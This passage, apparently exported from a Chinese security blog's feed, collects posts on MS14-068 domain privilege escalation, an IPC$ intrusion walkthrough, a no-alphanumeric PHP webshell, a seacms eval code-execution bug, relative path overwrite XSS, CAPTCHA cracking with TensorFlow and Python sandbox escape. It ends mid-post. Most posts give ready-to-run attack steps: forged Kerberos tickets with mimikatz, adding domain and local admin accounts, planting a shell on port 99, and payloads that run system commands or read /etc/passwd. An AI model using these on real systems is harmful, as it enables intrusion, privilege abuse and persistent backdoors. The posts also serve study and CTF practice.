    <content type="text"><![CDATA[ms14-068漏洞在域控没有打补丁（kb3011780）时，能将任意域用户，提升为域管理员权限。详细介绍：深入解读MS14-068漏洞 补充：添加域用户MS14-068 域用户权限提升漏洞复现 ms14068.exe 伪造kerberos票据12ms1m 4068.exe -u test@domaintest.com -p 123456 -s S-1-5-21-1607545464-3564583392-2085136103-1114-d WIN-0IQJV7P073G.domaintest.com mimikatz 导入票据 1mimikatz.exe "kerberos::ptc TGT_test@domaintest.com.ccache" exit 拿到域管理权限便可进行其他一系列操作123456dir \\WIN-0IQJV7P073G.domaintest.com\c$ 注意这里应为域控主机名称，不能为ipnet user admin xxxxx@password /add /domainnet group "Domain Admins" admin /add /domainPsExec.exe \\192.168.111.129 cmd.exe]]></content>
      <categories>
        <category>windows安全</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[域渗透 IPC$]]></title>
    <url>%2F%E5%9F%9F%E6%B8%97%E9%80%8F-IPC%2F</url>
    <content type="text"><![CDATA[IPC$(Internet Process Connection)是共享”命名管道”的资源(大家都是这么说的)，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。 IPC$漏洞：ipc$连接建立后，被连接的主机没有把对方的活动限制在进程间通信范围内，而是允许对方越权访问非IPC$的共享资源。 ipc$甚至可以以空连接的形式进行连接，即可以不使用用户名，密码进行连接。虽然空连接没有任何权限，但是可以得到目标主机上的用户列表，作为信息收集，为进一步的渗透做准备。 ipc$的一些命令 12345678910net share //查看是否开启IPC$net share ipc$ //开启ipc$net share ipc$ /del //关闭ipc$共享net use \\ip\ipc$ ""/user:"" //建立空连接net use \\ip\ipc$ "password"/user:"username" //建立连接 net use z: \\ip\admin$ //映射目标主机admin$(windows)目录到本地z盘 net use \\IP\ipc$ /del //删除一个ipc$连接net use z: /del //删除映射目录 经典入侵模式 123456789101112131415161718192021222324252627282930313233343536371. C:\&gt;net use \\127.0.0.1\IPC$ "" /user:"admintitrators" 这是用《流光》扫到的用户名是administrators，密码为"空"的IP地址(空口令?哇,运气好到家了)，如果是打算攻击的话，就可以用这样的 命令来与127.0.0.1建立一个连接，因为密码为"空"，所以第一个引号处就不用输入，后面一个双引号里的是用户名，输入 administrators，命令即可成功完成。2. C:\&gt;copy srv.exe \\127.0.0.1\admin$ 先复制srv.exe上去，在流光的Tools目录下就有（这里的$是指admin用户的c:\winnt\system32\，大家还可以使用c$、 d$，意思是C盘与D盘，这看你要复制到什么地方去了）。3. C:\&gt;net time \\127.0.0.1 查查时间，发现127.0.0.1 的当前时间是 2002/3/19 上午 11:00，命令成功完成。4. C:\&gt;at \\127.0.0.1 11:05 srv.exe 用at命令启动srv.exe吧（这里设置的时间要比主机时间快，不然你怎么启动啊，呵呵！）5. C:\&gt;net time \\127.0.0.1再查查到时间没有？如果127.0.0.1 的当前时间是 2002/3/19 上午 11:05，那就准备开始下面的命令。6. C:\&gt;telnet 127.0.0.1 99 这里会用到Telnet命令吧，注意端口是99。Telnet默认的是23端口，但是我们使用的是SRV在对方计算机中为我们建立一个99端口的 Shell。虽然我们可以Telnet上去了，但是SRV是一次性的，下次登录还要再激活！所以我们打算建立一个Telnet服务！这就要用到ntlm了7.C:\&gt;copy ntlm.exe \\127.0.0.1\admin$用Copy命令把ntlm.exe上传到主机上（ntlm.exe也是在《流光》的Tools目录中）。8. C:\WINNT\system32&gt;ntlm 输入ntlm启动（这里的C:\WINNT\system32&gt;指的是对方计算机，运行ntlm其实是让这个程序在对方计算机上运行）。当出 现"DONE"的时候，就说明已经启动正常。然后使用"net start telnet"来开启Telnet服务！9. Telnet 127.0.0.1，接着输入用户名与密码就进入对方了，操作就像在DOS上操作一样简单！(然后你想做什么?想做什么就做什么吧,哈哈)为了以防万一,我们再把guest激活加到管理组 10. C:\&gt;net user guest /active:yes 将对方的Guest用户激活11. C:\&gt;net user guest 1234 将Guest的密码改为1234,或者你要设定的密码12. C:\&gt;net localgroup administrators guest /add 将Guest变为Administrator^_^(如果管理员密码更改，guest帐号没改变的话，下次我们可以用guest再次访问这台计算机) 参考文档：https://wenku.baidu.com/view/fffd65fd77eeaeaad1f34693daef5ef7ba0d127f.html]]></content>
      <categories>
        <category>windows安全</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无字母数字shell]]></title>
    <url>%2F%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97shell%2F</url>
    <content type="text"><![CDATA[最近看到一个ctf题目，关于无字母数字获取shell的，记录一下12345678910111213141516&lt;?phpinclude 'flag.php';if(isset($_GET['code']))&#123; $code = $_GET['code']; if(strlen($code)&gt;40)&#123; die("Long."); &#125; if(preg_match("/[A-Za-z0-9]+/",$code))&#123; die("NO."); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;//$hint = "php function getFlag() to get flag";?&gt; 代码进行了字母数字过滤，并且限制了输入长度。那么按照我们利用异或和php弱类型的一些特性，将符号转换为字母，再拼接函数，或者我们想要利用的webshell;下面进行简单的演示：123456echo 'g'^'&lt;'; // 输出结果为 [ echo '['^'&lt;'; // 这样便可以得到 gecho ('['^'&lt;').(':'^'_'); // 拼接之后得到 geecho '[:'^'&lt;_'; // 为了减少长度，这样同样可以输出与上面相同的效果 geecho '[:[:,_]'^'&lt;_/|@&gt;:';// 构造出getFlag,而此时仅用了19个字符的长度 那么重点来了，既然我们已经构造出了getFlag，再加个()，拼接进去()不是就能直接读取题目的flag了,确实是这样，但如果直接拼进字符串是没有效果的，其只能作为字符串而不能被当作函数，我们还要进行适当的拼接。12$_ = '[:[:,_]'^'&lt;_/|@&gt;:'; // getFlag$_(); // getFlag() 这样就会变成函数了 那么我们最终的payload即为：?code=$=’[:[:,]’^’&lt;/|@&gt;:’;$(); 这样仅仅是调用了一个输出flag的函数，那么我们要是在实际环境中想继续利用的话，我们需要构造出一个webshell。12$_="`&#123;&#123;&#123;"^"?&lt;&gt;/"; // _GET$&#123;$_&#125;[_]($&#123;$_&#125;[__]); // $_GET[_]($GET_[__]) 这样就突破了code的长度限制，利用get传入两个变量，一个作为函数名，一个作为函数参数。就可以实现一个任意代码执行了。例如利用system执行系统命令1?code=$_="`&#123;&#123;&#123;"^"?&lt;&gt;/";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=system&amp;__=whoami]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[seacms v6.45 前台任意代码执行漏洞]]></title>
    <url>%2Fseacms-v6-45-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[漏洞代码出现在/include/main.class.php第3098行的parseIf()函数，该函数主要目的为对传进来的参数$content进行匹配，匹配出符合规则的if语句，带入eval()函数执行。相关代码如下：123456789101112131415161718192021 $labelRule = buildregx("&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;","is");$labelRule2="&#123;elseif";$labelRule3="&#123;else&#125;";preg_match_all($labelRule,$content,$iar);$arlen=count($iar[0]);$elseIfFlag=false;for($m=0;$m&lt;$arlen;$m++)&#123; $strIf=$iar[1][$m]; $strIf=$this-&gt;parseStrIf($strIf); $strThen=$iar[2][$m]; $strThen=$this-&gt;parseSubIf($strThen); if (strpos($strThen,$labelRule2)===false)&#123; if (strpos($strThen,$labelRule3)&gt;=0)&#123; $elsearray=explode($labelRule3,$strThen); $strThen1=$elsearray[0]; $strElse1=$elsearray[1]; @eval("if(".$strIf.")&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;"); $test1 = "if(".$strIf.")&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;"; if ($ifFlag)&#123; $content=str_replace($iar[0][$m],$strThen1,$content);&#125; else &#123;$content=str_replace($iar[0][$m],$strElse1,$content);&#125; &#125;else&#123; @eval("if(".$strIf.") &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;"); 可以看出在该函数中，对带入eval函数的内容未做任何过滤，存在任意代码执行的隐患。我们只需要构造$strIf=1)phpinfo();if(1的形式那么就可以执行任意代码了。想法很美好，那么就看看有没有我们可以控制的地方。全局查找该函数，可以发现有很多出调用的地方，在前台搜索处echoSearchPage()函数中，有用户可以控制的变量，跟进search.php查看一下。在212行，$content变量传入parseIf()函数 1$content=$mainClassObj-&gt;parseIf($content); 而往前查看，会发现有很多可控的变量代入了$content中。12345$content = str_replace("&#123;searchpage:page&#125;",$page,$content);$content = str_replace("&#123;seacms:searchword&#125;",$searchword,$content);$content = str_replace("&#123;seacms:searchnum&#125;",$TotalResult,$content);$content = str_replace("&#123;searchpage:ordername&#125;",$order,$content);...... 而这里的$order变量被定义为global变量，而在search.php的开始位置处，对$$_GET传入的变量进行了变量注册。12345foreach($_GET as $k=&gt;$v)&#123; $$k=_RunMagicQuotes(gbutf8(RemoveXSS($v))); $schwhere.= "&amp;$k=".urlencode($$k);&#125; 那么按照我们的预想，$order直接通过str_replace()函数进入了$content，而$content又直接进入带有eval的parseIf()函数。只需要根据$labelRule = buildregx(“{if:(.?)}(.?){end if}”,”is”);构造符合规则的payload就可以爽歪歪了。 在此之前，通过打印$content，可以发现$order传入之后类似这样1&#123;if:"$order"=="time"&#125; 那么根据前边贴出的代码@eval(“if(“.$strIf.”) { \$ifFlag=true;} else{ \$ifFlag=false;}”);，我们需要构造的是$strIf，而它截取的便是”$order”==”time”这部分。那么我们需要符合正则匹配，并且闭合eval中原有的语句，再就很容易构造出payload的形式：}{end if} {if:1)phpinfo();if(1}{end if}但是我们提交之后发现并没有按照预期的来，在$content中，我们传入的$order变成了 {if:”}{end if} {if:1)phpinfo();if(1}{end if}”==”score”} 可以发现在if：中间多了个,那么这就导致这部分内容无法通过正则匹配，也就没有进入eval获得执行。 往前翻其实就可以发现，在GET传进来参数进行注册变量的时候，其实是对注册的变量的变量做了过滤的。1$$k=_RunMagicQuotes(gbutf8(RemoveXSS($v))); 而这个RemoveXSS()不仅是做了xss的过滤，跟进代码查看一下其中一处过滤1$ra1 = Array('_GET','_POST','_COOKIE','_REQUEST','if:','javascript', 'vbscript', 'expression', 'applet', 'meta', 'xml', 'blink', 'link', 'style', 'script', 'embed', 'object', 'iframe', 'frame', 'frameset', 'ilayer', 'layer', 'bgsound', 'title', 'base', 'eval', 'passthru', 'exec', 'assert', 'system', 'chroot', 'chgrp', 'chown', 'shell_exec', 'proc_open', 'ini_restore', 'dl', 'readlink', 'symlink', 'popen', 'stream_socket_server', 'pfsockopen', 'putenv', 'cmd'); 在这里可以找到我们传入的if:，在下面的代码就是对if:中间插入,使得其失去了原本的意义。很明显，开发者在使用eval函数的时候考虑到了这个问题。对传入其中的参数做了合适的过滤。 漏洞出现的原因是因为对问题考虑的不够全面。按照吴翰清的说法便是没有做好“威胁分析”，虽然开发者对传入的GET参数做足了过滤，但却没有考虑post的情况，因为表面上在这里并没有用到POST，但很不巧的是，继续分析可以看到一处require_once(“include/common.php”);文件包含了进来。而正是在这个common.php中，出现了POST。123456789101112foreach($_REQUEST as $_k=&gt;$_v)&#123; echo m_eregi('^(cfg_|GLOBALS)',$_k); if( strlen($_k)&gt;0 &amp;&amp; m_eregi('^(cfg_|GLOBALS)',$_k) &amp;&amp; !isset($_COOKIE[$_k]) ) &#123; exit('Request var not allow!'); &#125;&#125;foreach(Array('_GET','_POST','_COOKIE') as $_request)&#123; foreach($$_request as $_k =&gt; $_v) $&#123;$_k&#125; = _RunMagicQuotes($_v);&#125; 在这里仅仅对$_REQUEST传来的参数做了是否与全局变量冲突的检查和使用了addslashes()做了简单的转义。那么就可以POST传入我们前边准备好的payload。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>seacms</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tensorflow 基于CNN模型的验证码识别]]></title>
    <url>%2Ftensorflow-%E5%9F%BA%E4%BA%8ECNN%E6%A8%A1%E5%9E%8B%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB%2F</url>
    <content type="text"><![CDATA[仅以此文记录深度学习入门过程。 介绍深度学习（Deep learing）是近几年比较火的一个概念，而验证码安全在web安全中也有着重要的地位，那么本文将二者结合，将验证码的识别，作为深度学习的一个入门。 工欲善其事必先利其器，在这里介绍一个谷歌研发的开源机器学习框架—Tensorflow tensorflow使用教程 开工1. 数据预处理 数据准备首先准备大量的图片验证码，将其分为训练集和验证集。六万验证码 网盘密码d3iq训练集用于神经网络的训练，验证集用于验证正确率。 为什么要分开 ？？ 否则会造成污染，导致模型已认识这个数据了 数据处理 图片处理 标签处理 —&gt;标签向量化 12345678910111213141516171819202122232425262728def text2vec(text): """ 文本转向量 Parameters: text:文本 Returns: vector:向量 """ if len(text) &gt; 4: raise ValueError('验证码最长4个字符') vector = np.zeros(4 * 63) def char2pos(c): if c =='_': k = 62 return k k = ord(c) - 48 if k &gt; 9: k = ord(c) - 55 if k &gt; 35: k = ord(c) - 61 if k &gt; 61: raise ValueError('No Map') return k for i, c in enumerate(text): idx = i * 63 + char2pos(c) vector[idx] = 1 return vector 2.CNN卷积神经网络通俗理解 特点：卷积神经网络引入卷积核解决图像数据非常大而产生的网络参数非常大问题。卷积神经网络组成 1234567卷积层（Convolution）激活层（Activation）池化层（Pooling）完全连接层（Fullyconnected） 卷积层 卷积核 一个有着固定取值的卷积核对图像矩阵进行扫描 在图像识别领域，卷积神经网络中的卷积核（滤镜）要实现的就是，将图像中的特征提取出来。 在最初的卷积层中，成千上万的神经元充当第一组过滤器，搜寻图像中的每个部分和像素，找出模式（pattern）。随着越来越多的图像被处理，每个神经元逐渐学习过滤特定的特征，这提高了准确性。 比如图像是苹果，一个过滤器可能专注于发现“红色”这一颜色，而另一个过滤器可能会寻找圆形边缘，另一个过滤器则会识别细细的茎。卷积层就是通过将图像分解成不同的特征来做这件事的。 具体怎么提取？ 以猫为例，显著特征是圆眼睛三角耳朵尖下巴，但是总体来说狐狸也长这个样子，只是耳朵更大，下巴更尖而已。这些细小的区别很难描述。 池化层 整个图像中的这种“卷积”会产生大量的信息，这可能会很快成为一个计算噩梦。 为了描述大的图像，一个很自然的想法就是对不同位置的特征进行聚合统计，例如，人们可以计算图像一个区域上的某个特定特征的平均值 (或最大值)。这些概要统计特征不仅具有低得多的维度 (相比使用所有提取得到的特征)，同时还会改善结果(不容易过拟合)。这种聚合的操作就叫做池化 (pooling) 进入池化层，可将其全部缩小成更通用和可消化的形式。有很多方法可以解决这个问题，但最受欢迎的是“最大池”（MaxPooling） 全连接层全连接就是个矩阵乘法，相当于一个特征空间变换，可以把有用的信息提取整合。全连接层一般在卷积网络的最后。 当然通过这些特征得到的结果不一定是正确的，因此需要一个‘反向传播的过程’对得到的结果进行‘纠正’。 反向传播将反馈发送到上一层的节点，告诉它答案差了多少。然后，该层再将反馈发送到上一层，再传到上一层，直到它回到卷积层，来进行调整，以帮助每个神经元在随后的图像在网络中传递时更好地识别数据。 这个过程一直反复进行，直到神经网络以更准确的方式识别图像中的苹果和橘子，最终以100％的正确率预测结果——尽管许多工程师认为85％是可以接受的。这时，神经网络已经准备好了，可以开始真正识别图片中的苹果了。 代码实现 3卷积层+1全连接层12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576def crack_captcha_cnn(self, w_alpha=0.01, b_alpha=0.1): """ 定义CNN Parameters: w_alpha:权重系数 b_alpha:偏置系数 Returns: out:CNN输出 """ # 卷积的input: 一个Tensor。数据维度是四维[batch, in_height, in_width, in_channels] # 具体含义是[batch大小, 图像高度, 图像宽度, 图像通道数] # 因为是灰度图，所以是单通道的[?, 100, 30, 1] x = tf.reshape(self.X, shape=[-1, self.heigth, self.width, 1]) # 卷积的filter:一个Tensor。数据维度是四维[filter_height, filter_width, in_channels, out_channels] # 具体含义是[卷积核的高度, 卷积核的宽度, 图像通道数, 卷积核个数] w_c1 = tf.Variable(w_alpha*tf.random_normal([3, 3, 1, 32])) # 偏置项bias b_c1 = tf.Variable(b_alpha*tf.random_normal([32])) # conv2d卷积层输入: # strides: 一个长度是4的一维整数类型数组，每一维度对应的是 input 中每一维的对应移动步数 # padding：一个字符串，取值为 SAME 或者 VALID 前者使得卷积后图像尺寸不变, 后者尺寸变化 # conv2d卷积层输出: # 一个四维的Tensor, 数据维度为 [batch, out_width, out_height, in_channels * out_channels] # [?, 100, 30, 32] # 输出计算公式H0 = (H - F + 2 * P) / S + 1 # 对于本卷积层而言,因为padding为SAME,所以P为1。 # 其中H为图像高度,F为卷积核高度,P为边填充,S为步长 # 学习参数: # 32*(3*3+1)=320 # 连接个数: # (输出图像宽度*输出图像高度)(卷积核高度*卷积核宽度+1)*卷积核数量(100*30)(3*3+1)*32=100*30*320=960000个 # bias_add:将偏差项bias加到value上。这个操作可以看做是tf.add的一个特例，其中bias是必须的一维。 # 该API支持广播形式，因此value可以是任何维度。但是，该API又不像tf.add，可以让bias的维度和value的最后一维不同， conv1 = tf.nn.relu(tf.nn.bias_add(tf.nn.conv2d(x, w_c1, strides=[1, 1, 1, 1], padding='SAME'), b_c1)) # max_pool池化层输入： # ksize:池化窗口的大小，取一个四维向量，一般是[1, height, width, 1] # 因为我们不想在batch和channels上做池化，所以这两个维度设为了1 # strides:和卷积类似，窗口在每一个维度上滑动的步长，一般也是[1, stride,stride, 1] # padding:和卷积类似，可以取'VALID' 或者'SAME' # max_pool池化层输出： # 返回一个Tensor，类型不变，shape仍然是[batch, out_width, out_height, in_channels]这种形式 # [?, 50, 15, 32] # 学习参数: # 2*32 # 连接个数: # 15*50*32*(2*2+1)=120000 conv1 = tf.nn.max_pool(conv1, ksize=[1, 2, 2, 1], strides=[1, 2, 2, 1], padding='SAME') w_c2 = tf.Variable(w_alpha*tf.random_normal([3, 3, 32, 64])) b_c2 = tf.Variable(b_alpha*tf.random_normal([64])) # [?, 50, 15, 64] conv2 = tf.nn.relu(tf.nn.bias_add(tf.nn.conv2d(conv1, w_c2, strides=[1, 1, 1, 1], padding='SAME'), b_c2)) # [?, 25, 8, 64] conv2 = tf.nn.max_pool(conv2, ksize=[1, 2, 2, 1], strides=[1, 2, 2, 1], padding='SAME') w_c3 = tf.Variable(w_alpha*tf.random_normal([3, 3, 64, 64])) b_c3 = tf.Variable(b_alpha*tf.random_normal([64])) # [?, 25, 8, 64] conv3 = tf.nn.relu(tf.nn.bias_add(tf.nn.conv2d(conv2, w_c3, strides=[1, 1, 1, 1], padding='SAME'), b_c3)) # [?, 13, 4, 64] conv3 = tf.nn.max_pool(conv3, ksize=[1, 2, 2, 1], strides=[1, 2, 2, 1], padding='SAME') # [3328, 1024] w_d = tf.Variable(w_alpha*tf.random_normal([4*13*64, 1024])) b_d = tf.Variable(b_alpha*tf.random_normal([1024])) # [?, 3328] dense = tf.reshape(conv3, [-1, w_d.get_shape().as_list()[0]]) # [?, 1024] dense = tf.nn.relu(tf.add(tf.matmul(dense, w_d), b_d)) dense = tf.nn.dropout(dense, self.keep_prob) # [1024, 63*4=252] w_out = tf.Variable(w_alpha*tf.random_normal([1024, self.max_captcha*self.char_set_len])) b_out = tf.Variable(b_alpha*tf.random_normal([self.max_captcha*self.char_set_len])) # [?, 252] out = tf.add(tf.matmul(dense, w_out), b_out) # out = tf.nn.softmax(out) return out]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
      <tags>
        <tag>tensorflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RPO相对路径覆盖攻击]]></title>
    <url>%2FRPO%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84%E8%A6%86%E7%9B%96%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[0x01 RPO简介RPO(Relative Path Overwrite)相对路径覆盖，是一种利用相对URL路径覆盖目标文件的一种攻击手段。该攻击方法利用浏览器和服务器对资源加载设置的差异，通过某些方法和技巧，在相对路径处，引入我们可控的js/css文件，甚至引入非js/css文件，并按照js/css的语法执行，从而实现攻击。 0x02 漏洞成因2.1 pathinfo模式在介绍漏洞成因之前先介绍一下pathinfo这种url解析模式。对于访问一个以MVC模式搭建的网站，必然带有M、C、A三个参数即module、controller、action，这些参数需要还需要用&amp;符号隔开，假若参数量很多，就显得特别的不友好啦。然而PathInfo模式功能就是将这一长串缩短简化，让这个路径变得更加友好的显示。传统的访问路径是这样子的：1 http://www.example.com/index.php?m=module&amp;c=controller&amp;a=action&amp;var1=vaule1&amp;var2=vaule2..... 而在pathinfo的URL模式下路径:1 http://www.example.com/index.php/module/controller/action/var1/vaule1/var2/value2..... 2.2 服务端与客户端解码差异在服务端中，编码后的url服务器可以正常识别，也就是说服务器在加载文件时会解码后找到具体文件返回返回客户端。但是在客户端识别url时是不会解码的,如果某些静态资源文件使用相对路径,就很容易遭受RPO相对路径覆盖攻击.有点绕，那么用一个简单例子理解一下：1http://127.0.0.1/index.php/test/..%2f..%2findex.php 在服务端，%2f会被解码为/，apache和nginx会按照目录的方式来返回我们请求的资源。也就是访问 http://127.0.0.1/index.php/test/../../index.php 即返回 http://127.0.0.1/index.php 的内容。而在客户端，浏览器并没有对%2f进行解码，在pathInfo模式下认为..%2f..%2findex.php为一个无效的数据而返回test的内容。 2.3 触发条件触发这个漏洞有两个基本的前提：①Apache 配置错误导致AllowEncodedSlashes这个选项开启（对Apache来说默认情况下 AllowEncodedSlashes 这个选项是关闭的），或者nginx服务器。②存在相对路径的js或者css的引用 0x03 利用演示 1.加载任意目录下静态资源文件搭建本地环境/test/index.html1234567891011&lt;html &gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Rpo Test&lt;/title&gt; &lt;script src="1.js"&gt; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Test.....&lt;h1&gt;&lt;/body&gt;&lt;/html&gt; 客户端加载的静态资源是/test目录下的1.js文件,内容为:1document.write('&lt;p&gt;t=This is test_111111&lt;/p&gt;'); 如果我们控制test下面css的目录下面的test_2.js的内容,写入/test/css/1.js内容如下:1document.write('&lt;p&gt;t=This is test_222222&lt;/p&gt;'); 那么当我们访问：http://test/index.html/css/..%2findex.html页面将会加载/test/css/1.js的输出内容，即实现了相对路径覆盖攻击, 我们成功覆盖掉了index.html中静态资源1.js的路径. 2.将返回内容按静态文件解析现在有如下环境：我们可以提交内容，然后内容会显示到当前页面，而且使用相对路径加载静态文件style.css和script.js文件，这两个文件原本内容为空，此时我们访问：http://127.0.0.1:8888/RPO_HACK/user/2这里表示使用2作为参数请求user接口，此时加载静态文件为：12http://127.0.0.1:8888/RPO_HACK/user/style.csshttp://127.0.0.1:8888/RPO_HACK/user/script.js 然后我们提交一段css内容：{} * {color:red;}当我们访问：http://127.0.0.1:8888/RPO_HACK/user/2/xxx时：这里表示我们使用2/xxx作为参数访问user接口，返回的内容和使用参数2访问返回的内容相同。但是浏览器客户端认为2是目录，然后加载的静态文件为:12http://127.0.0.1:8888/RPO_HACK/user/2/style.csshttp://127.0.0.1:8888/RPO_HACK/user/2/script.js 所以此时加载静态文件返回的内容也是同使用参数2访问时返回内容相同，但是此时浏览器认为这里加载的是样式文件和脚本文件，从而将返回内容解析为css或者js，所以我们提交的css内容：{} * {color:red;} 成功解析为css，将页面渲染成红色。 3.谷歌实例示例来自国外的一篇文章作者发现Google Toolbar的一个目标URL:http://www.google.com/tools/toolbar/buttons/apis/howto_guide.html, 该页面用相对路径导入CSS样式。css文件路径为../../styles.css，URL写为1http://www.google.com/tools/toolbar/buttons/apis%2fhowto_guide.html 返回正确服务器接收到的是*/tools/toolbar/buttons/apis/howto_guide.html浏览器接收到的是 */tools/toolbar/buttons/apis%2fhowto_guide.html页面中导入的样式表 为 */tools /toolbar/buttons/../../ style.css浏览器认为style.css的根目录是tools/toolbar/buttons，而不是tools/toolbar/button/apis所以../../style.css跳到了更高一级的目录下 除了跳目录以外，还能制作假目录，例如，我们想在导入的样式路径为/tools/fake/styles.css, 可以构造如下url:http://www.google.com/tools/fake/..%2ftoolbar/buttons/apis%2fhowto_guide.html服务器视角: /tools/fake/../toolbar/buttons/apis/ + howto_guide.浏览器视角: tools/fake/..%2ftoolbar/buttons/ + apis%2fhowto_guide.html导入的css样式: /tools/fake/..%2ftoolbar/buttons/../../ + style.css这里我们添加了两个虚假的路径:fake/和..%2f, 以便他们能在服务器相互抵消，同时浏览器认为fake/是一个真实的目录，并且，..%2ftoobar是另外一个目录作者在此基础上找到了一处可以利用的重定向页面，http://www.google.com/tools/toolbar/buttons/gallery会重定向到 http://www.google.com/gadgets/directory?synd=toolbar&amp;frontpage=1在这里参数q是作为搜索参数，并且反应在页面上，可以成功注入一个简单的payload:12![此处输入图片的描述][4]可以看到，这里可以控制q，能使用如下payload导入样式。 http://www.google.com/tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D*%257Bbackground%253Ared%257D/..%2f/apis/howto_guide.html12![此处输入图片的描述][5]当然到这里只是改变了页面样式，作者进一步利用，改变payload为 CSS XSS向量expression(alert(document.domain))，并启动IE8: http://www.google.com/tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D*%257Bx%253Aexpression(alert(document.domain))%257D/..%2f/apis/1234567891011121314151617![此处输入图片的描述][6]## 0x04 利用场景&gt; * 加载任意目录下静态资源文件如上演示,我们可以加载任意目录下的1.js去覆盖index.html中静态资源1.js的路径&gt; * 将任意文件内容按静态文件解析在使用了pathurl模式的php开发框架以及pythonweb框架中，经常使用相对路径来加载静态资源文件。比如一篇文章的链接为 index.php/view/article/666/view是index.php中的方法,article和666分别是传入的参数名和参数值.如果我们在其后加上..2f..%2f/这样路径会如何,服务端正常解码后返回/index.php/view页面的内容,但客户端不会解码,所有采用相对路径的静态资源文件的父路径变成了index.php/view/article/666/,而在这个链接后面加上的..%2f..%2f会被当做参数来解析,最后返回的还是index.php/view/article/666/文章的内容.这样我们就完成了将任意文件内容按静态文件来解析的漏洞利用了。## 0x05 ctf题目### 强网杯xss题：share your mind 题目提示xss bot使用了phantomjs登录后add页面可添加文章，而report页面可提交链接。而且网站静态js文件采用相对路径来访问根路径:/index.php中有一个静态文件是用相对路径表示的![此处输入图片的描述][7] ` 首先我们add一篇内容为: alert(1)的文章:得到文章路径:http://39.107.33.96:20000/index.php/view/article/41801我们在这个文章路径后面加上/..%2f..%2f..%2f, 然后在访问,发现页面会弹窗。也就是将我们添加的文章作为了js脚本运行。这是因为服务端会正常解码,跳转3个目录到index.php,返回给我们对应的内容。而客户端并不会解码%2f, 而是将..%2f..%2f..%2f 当成一个文件来看待了，客户端寻找js的路径为:http://39.107.33.96:20000/index.php/view/article/41801/static/js/jquery.min.jspathinfo的模式下,static/js/jquery.min.js 会被当做参数,最后返回的还是该文章的页面,即alert(1)的内容。到此即可找到xss攻击点，可进一步构造js代码读取cookie. 0x06 防护方案1.在页面中避免直接使用相对路径进行静态文件的加载，使用完整的url，或者所有的引用都加/。2.在页面开头，声明 &lt;!DOCTYPE html&gt;. 0x07 参考链接http://blog.nsfocus.net/rpo-attack/https://blog.innerht.ml/rpo-gadgets/https://xz.aliyun.com/t/2220]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>RPO</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python沙箱逃逸]]></title>
    <url>%2Fpython%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%2F</url>
    <content type="text"><![CDATA[0x00 前言ctf2018国赛的一道题目 拿到题目，nc连接之后得到一个命令交互会话。根据提示是个python环境，并且要拿到shell获取flag。那么很明显了，这是一个python沙箱环境，要进行逃逸获取shell。 0x01 题目分析首先尝试导入能执行系统命令的模块，当然，直接给报错了。然后又尝试一下import其他不敏感的模块，全都是返回ban。那么这里应该是对所有Import进行了拦截。那么直接上一种彪悍的方式，python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的1Payload: ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s') 但是就是在这里出现了一个很头疼的事，这个沙箱还过滤了敏感命令，比如os，ls ，sys，cat全都进行了过滤。而非常巧的是，func_globals里面包含了ls这个字符串，而这里又不能用字符串拼接的方式进行拼接。在这里饶了一大圈，尝试几种方式都没有成功。然后查了一大波文档，最终找到了一个非常有意思的方式 getattribute 。参考https://developers.google.com/protocol-buffers/docs/reference/python/type-class 示例：1x.__getattribute__('name') &lt;==&gt; x.name 那么这里可以看出，object x可以使用getattribute方法，这样name就变为字符串，也就达到了我们可以拼接的要求。那么上面的payload可以改为：1().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem'] ('l'+'s') 成功拿到一个shell。 0x02 通用payload文件读取：12a="".__class__.__mro__[-1].__subclasses__()[40]("/etc/passwd").read()a="".__class__.__mro__[-1].__subclasses__()[40]("/root/run.py").read() python shell-命令执行：1234().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ca'+'t'+' home/ctf/5c72a1d444cf3121a5d25f2db4147ebb')().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ca'+'t'+' home/ctf/cpython') 0x03 